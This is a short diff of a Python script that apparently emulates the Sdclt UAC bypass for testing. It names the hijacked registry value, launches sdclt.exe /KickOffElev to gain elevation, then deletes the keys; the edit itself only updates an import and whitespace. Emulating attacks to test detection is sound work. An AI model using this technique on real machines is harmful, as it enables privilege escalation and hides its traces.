@@ -6,7 +6,7 @@
 import subprocess
 import sys
 import os
-import _winreg as winreg
+import winreg
 import common
 
 # HKCU:\Software\Classes\exefile\shell\runas\command value: IsolatedCommand
@@ -26,7 +26,7 @@ def main(target_process=common.get_path("bin", "myapp.exe")):
 
     common.log("Running Sdclt to bypass UAC")
     common.execute([r"c:\windows\system32\sdclt.exe", "/KickOffElev"])
-    
+
     common.log("Clearing registry keys", log_type="-")
     winreg.DeleteValue(hkey, "IsolatedCommand")
     winreg.DeleteKey(hkey, "")
